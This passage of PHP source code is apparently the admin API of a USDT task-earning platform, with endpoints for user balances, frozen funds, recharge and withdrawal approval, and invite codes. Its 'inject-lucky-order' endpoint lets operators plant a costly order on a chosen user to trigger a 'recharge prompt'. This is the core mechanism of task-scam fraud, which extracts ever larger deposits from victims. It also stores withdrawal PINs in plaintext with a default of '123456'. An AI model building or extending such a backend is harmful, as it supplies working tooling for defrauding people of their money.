        $stmt = $db->query("SELECT id, username, balance, frozen_balance, completed_tasks, max_daily_tasks, vip_level, invite_code, invited_by, status, created_at FROM users ORDER BY id DESC");
        echo json_encode(['success' => true, 'users' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && $route === '/admin/users') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $body = getJsonInput();
        $username = trim($body['username'] ?? '');
        $password = $body['password'] ?? '';
        $balance = floatval($body['balance'] ?? 200);
        $dailyTasks = intval($body['max_daily_tasks'] ?? 60);
        $vip = intval($body['vip_level'] ?? 1);
        $pin = $body['withdrawal_pin'] ?? '123456';
        $code = strtoupper(trim($body['invite_code'] ?? generateRandomCode(8)));
        $now = date('Y-m-d H:i:s');

        $hash = password_hash($password, PASSWORD_BCRYPT);
        $insert = $db->prepare("INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, balance, completed_tasks, max_daily_tasks, vip_level, created_at) VALUES (?, ?, ?, ?, ?, 0, ?, ?, ?)");
        $insert->execute([$username, $hash, $pin, $code, $balance, $dailyTasks, $vip, $now]);
        $newId = $db->lastInsertId();

        echo json_encode([
            'success' => true,
            'message' => "User {$username} created successfully!",
            'user' => ['id' => $newId, 'username' => $username, 'balance' => $balance, 'invite_code' => $code]
        ]);
        exit;
    }

    // Admin Delete User
    if ($method === 'DELETE' && preg_match('#^/admin/users/(\d+)$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $uid = intval($m[1]);
        $db->prepare("DELETE FROM users WHERE id = ?")->execute([$uid]);
        echo json_encode(['success' => true, 'message' => "User #{$uid} deleted successfully."]);
        exit;
    }

    // Adjust Balance
    if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/adjust-balance$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $uid = intval($m[1]);
        $body = getJsonInput();
        $amt = floatval($body['amount'] ?? 0);

        $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")->execute([$amt, $uid]);
        echo json_encode(['success' => true, 'message' => "Balance adjusted by {$amt} USDT."]);
        exit;
    }

    // Adjust Tasks
    if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/update-tasks$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $uid = intval($m[1]);
        $body = getJsonInput();
        $comp = intval($body['completed_tasks'] ?? 0);
        $max = intval($body['max_daily_tasks'] ?? 60);

        $db->prepare("UPDATE users SET completed_tasks = ?, max_daily_tasks = ? WHERE id = ?")->execute([$comp, $max, $uid]);
        echo json_encode(['success' => true, 'message' => 'Task counts updated!']);
        exit;
    }

    // Toggle User Status
    if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/toggle-status$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $uid = intval($m[1]);
        $stmt = $db->prepare("SELECT status FROM users WHERE id = ?");
        $stmt->execute([$uid]);
        $status = $stmt->fetchColumn() === 'active' ? 'suspended' : 'active';
        $db->prepare("UPDATE users SET status = ? WHERE id = ?")->execute([$status, $uid]);
        echo json_encode(['success' => true, 'message' => "User status set to {$status}."]);
        exit;
    }

    // Inject Lucky Order
    if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/inject-lucky-order$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $uid = intval($m[1]);
        $body = getJsonInput();

        $amount = floatval($body['amount'] ?? 315.72);
        $return = floatval($body['expected_return'] ?? 18.94);
        $prod = $body['product_name'] ?? 'Sony PlayStation 5 Pro & PS VR2 Master Combo Bundle';
        $now = date('Y-m-d H:i:s');

        $db->prepare("INSERT INTO lucky_order_triggers (user_id, amount, expected_return, product_name, is_active, created_at) VALUES (?, ?, ?, ?, 1, ?)")
           ->execute([$uid, $amount, $return, $prod, $now]);

        echo json_encode(['success' => true, 'message' => 'Lucky order injected! User will see recharge prompt upon next matching click.']);
        exit;
    }

    // List Lucky Orders
    if ($method === 'GET' && $route === '/admin/lucky-orders') {
        requireAdminAuth($db, $JWT_SECRET);
        $stmt = $db->query("
            SELECT l.*, u.username, u.balance as user_balance
            FROM lucky_order_triggers l
            JOIN users u ON l.user_id = u.id
            ORDER BY l.id DESC
        ");
        echo json_encode(['success' => true, 'lucky_orders' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'DELETE' && preg_match('#^/admin/lucky-orders/(\d+)$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $db->prepare("DELETE FROM lucky_order_triggers WHERE id = ?")->execute([intval($m[1])]);
        echo json_encode(['success' => true, 'message' => 'Trigger deleted.']);
        exit;
    }

    // Recharges Approval
    if ($method === 'GET' && $route === '/admin/recharges') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
        $stmt = $db->query("
            SELECT r.*, u.username, u.balance as user_balance
            FROM recharges r
            JOIN users u ON r.user_id = u.id
            ORDER BY r.id DESC
        ");
        echo json_encode(['success' => true, 'recharges' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && preg_match('#^/admin/recharges/(\d+)/process$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
        $rid = intval($m[1]);
        $body = getJsonInput();
        $action = $body['action'] ?? 'approve';
        $now = date('Y-m-d H:i:s');

        $stmt = $db->prepare("SELECT * FROM recharges WHERE id = ?");
        $stmt->execute([$rid]);
        $recharge = $stmt->fetch();

        if ($action === 'approve') {
            $db->prepare("UPDATE recharges SET status = 'approved', processed_at = ? WHERE id = ?")->execute([$now, $rid]);
            $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")->execute([$recharge['amount'], $recharge['user_id']]);
            echo json_encode(['success' => true, 'message' => "Recharge approved! {$recharge['amount']} USDT credited to user."]);
        } else {
            $db->prepare("UPDATE recharges SET status = 'rejected', processed_at = ? WHERE id = ?")->execute([$now, $rid]);
            echo json_encode(['success' => true, 'message' => 'Recharge rejected.']);
        }
        exit;
    }

    // Withdrawals Approval
    if ($method === 'GET' && $route === '/admin/withdrawals') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
        $stmt = $db->query("
            SELECT w.*, u.username, u.balance as user_balance
            FROM withdrawals w
            JOIN users u ON w.user_id = u.id
            ORDER BY w.id DESC
        ");
        echo json_encode(['success' => true, 'withdrawals' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && preg_match('#^/admin/withdrawals/(\d+)/process$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
        $wid = intval($m[1]);
        $body = getJsonInput();
        $action = $body['action'] ?? 'approve';
        $now = date('Y-m-d H:i:s');

        $stmt = $db->prepare("SELECT * FROM withdrawals WHERE id = ?");
        $stmt->execute([$wid]);
        $withdrawal = $stmt->fetch();

        if ($action === 'approve') {
            $db->prepare("UPDATE withdrawals SET status = 'approved', processed_at = ? WHERE id = ?")->execute([$now, $wid]);
            $db->prepare("UPDATE users SET frozen_balance = frozen_balance - ? WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['user_id']]);
            echo json_encode(['success' => true, 'message' => 'Withdrawal approved. Funds marked sent.']);
        } else {
            $db->prepare("UPDATE withdrawals SET status = 'rejected', processed_at = ? WHERE id = ?")->execute([$now, $wid]);
            $db->prepare("UPDATE users SET balance = balance + ?, frozen_balance = frozen_balance - ? WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['amount'], $withdrawal['user_id']]);
            echo json_encode(['success' => true, 'message' => 'Withdrawal rejected and balance refunded to user.']);
        }
        exit;
    }

    // Admin Products Catalog
    if ($method === 'GET' && $route === '/admin/products') {
        requireAdminAuth($db, $JWT_SECRET);
        $stmt = $db->query("SELECT * FROM products ORDER BY id DESC");
        echo json_encode(['success' => true, 'products' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && $route === '/admin/products') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $body = getJsonInput();
        $db->prepare("INSERT INTO products (name, price, commission_rate, image_url) VALUES (?, ?, ?, ?)")
           ->execute([$body['name'], floatval($body['price']), floatval($body['commission_rate'] ?? 0.006), $body['image_url'] ?? '']);
        echo json_encode(['success' => true, 'message' => 'Product added!']);
        exit;
    }

    if ($method === 'DELETE' && preg_match('#^/admin/products/(\d+)$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $db->prepare("DELETE FROM products WHERE id = ?")->execute([intval($m[1])]);
        echo json_encode(['success' => true, 'message' => 'Product deleted.']);
        exit;
    }

    // Admin Invite Codes
    if ($method === 'GET' && $route === '/admin/invite-codes') {
        requireAdminAuth($db, $JWT_SECRET);
        $stmt = $db->query("SELECT * FROM admin_invite_codes ORDER BY id DESC");
        echo json_encode(['success' => true, 'codes' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && $route === '/admin/invite-codes/generate') {
        $admin = requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $body = getJsonInput();
        $code = strtoupper(trim($body['code'] ?? $body['custom_code'] ?? ''));
        $bonus = floatval($body['bonus_balance'] ?? 200.00);
        $maxUses = intval($body['max_uses'] ?? 1);
        $vip = intval($body['vip_level'] ?? 1);
        $now = date('Y-m-d H:i:s');

        if (!empty($code)) {
            $insert = $db->prepare("INSERT INTO admin_invite_codes (code, bonus_balance, max_uses, used_count, vip_level, status, created_by, created_at) VALUES (?, ?, ?, 0, ?, 'active', ?, ?)");
            $insert->execute([$code, $bonus, $maxUses, $vip, $admin['username'], $now]);
            echo json_encode(['success' => true, 'message' => "Custom VIP Code {$code} created!", 'codes' => [$code]]);
        } else {
            $count = max(1, min(50, intval($body['count'] ?? 1)));
            $codes = [];
            $insert = $db->prepare("INSERT INTO admin_invite_codes (code, bonus_balance, max_uses, used_count, vip_level, status, created_by, created_at) VALUES (?, ?, ?, 0, ?, 'active', ?, ?)");
            for ($i = 0; $i < $count; $i++) {
                $c = generateRandomCode(8);
                $insert->execute([$c, $bonus, $maxUses, $vip, $admin['username'], $now]);
                $codes[] = $c;
            }
            echo json_encode(['success' => true, 'message' => "Generated " . count($codes) . " VIP codes!", 'codes' => $codes]);
        }
        exit;
    }

    if ($method === 'DELETE' && preg_match('#^/admin/invite-codes/(\d+)$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
        $db->prepare("DELETE FROM admin_invite_codes WHERE id = ?")->execute([intval($m[1])]);
        echo json_encode(['success' => true, 'message' => 'Invite code deleted.']);
        exit;
    }

    // Admin Roster (RBAC)
    if ($method === 'GET' && $route === '/admin/admins') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $stmt = $db->query("SELECT id, username, role, created_at FROM admins ORDER BY id ASC");
        echo json_encode(['success' => true, 'admins' => $stmt->fetchAll()]);
        exit;
    }

    if ($method === 'POST' && $route === '/admin/admins') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $body = getJsonInput();
        $username = trim($body['username'] ?? '');
        $password = $body['password'] ?? '';
        $role = $body['role'] ?? 'manager';
        $now = date('Y-m-d H:i:s');

        $hash = password_hash($password, PASSWORD_BCRYPT);
        $db->prepare("INSERT INTO admins (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)")
           ->execute([$username, $hash, $role, $now]);

        echo json_encode(['success' => true, 'message' => "Admin {$username} ({$role}) created!"]);
        exit;
    }

    if ($method === 'DELETE' && preg_match('#^/admin/admins/(\d+)$#', $route, $m)) {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $aid = intval($m[1]);
        $stmt = $db->prepare("SELECT username FROM admins WHERE id = ?");
        $stmt->execute([$aid]);
        $name = $stmt->fetchColumn();
        if ($name === 'admin') {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => 'Primary superadmin cannot be deleted.']);
            exit;
        }
        $db->prepare("DELETE FROM admins WHERE id = ?")->execute([$aid]);
        echo json_encode(['success' => true, 'message' => 'Admin account deleted.']);
        exit;
    }

    // Settings
    if ($method === 'GET' && $route === '/admin/settings') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $stmt = $db->query("SELECT key, value FROM system_settings");
        $settings = [];
        while ($row = $stmt->fetch()) {
            $settings[$row['key']] = $row['value'];
        }
        echo json_encode(['success' => true, 'settings' => $settings]);
        exit;
    }

    if ($method === 'POST' && $route === '/admin/settings') {
        requireAdminAuth($db, $JWT_SECRET, ['superadmin']);
        $body = getJsonInput();
        $settings = $body['settings'] ?? [];
        $stmt = $db->prepare("INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)");
        foreach ($settings as $k => $v) {
            $stmt->execute([$k, strval($v)]);
        }
        echo json_encode(['success' => true, 'message' => 'Platform settings saved!']);
        exit;
    }

    // 404 Route Not Found
    http_response_code(404);
    echo json_encode(['success' => false, 'message' => "Endpoint not found: {$method} {$route}"]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error: ' . $e->getMessage()]);
}
